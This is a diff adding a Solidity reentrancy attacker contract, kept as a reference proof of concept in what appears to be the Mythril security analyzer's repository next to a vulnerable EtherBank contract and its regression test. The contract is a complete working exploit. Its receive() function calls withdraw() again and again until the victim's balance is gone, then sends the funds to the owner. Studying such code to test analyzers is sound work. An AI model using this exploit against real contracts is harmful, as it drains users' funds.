@@ -1,0 +1,47 @@
+// Reference only: original Hardhat PoC, kept as pasted. Needs a Hardhat
+// project (for hardhat/console.sol) to compile — Mythril does not run this
+// file. The dependency-free contract it targets is analyzed instead at
+// ../etherbank_vulnerable.sol (see tests/integration_tests/analysis_tests.py
+// for the corresponding Mythril regression test).
+
+// ATTACKER SMART CONTRACT
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.11;
+import "hardhat/console.sol";
+
+interface IEtherBank {
+    function deposit() external payable;
+    function withdraw() external;
+}
+
+contract Attacker {
+    IEtherBank public immutable etherBank;
+    address private owner;
+
+    constructor(address etherBankAddress) {
+        etherBank = IEtherBank(etherBankAddress);
+        owner = msg.sender;
+    }
+
+    function attack() external payable{
+        etherBank.deposit{value: msg.value}();
+        etherBank.withdraw();
+    }
+
+    receive() external payable {
+        if (address(etherBank).balance > 0) {
+            console.log("reentering...");
+            etherBank.withdraw();
+        } else {
+            console.log('victim account drained');
+            payable(owner).transfer(address(this).balance);
+        }
+    }
+
+    // check the total balance of the Attacker contract
+    function getBalance() external view returns (uint) {
+        return address(this).balance;
+    }
+
+}
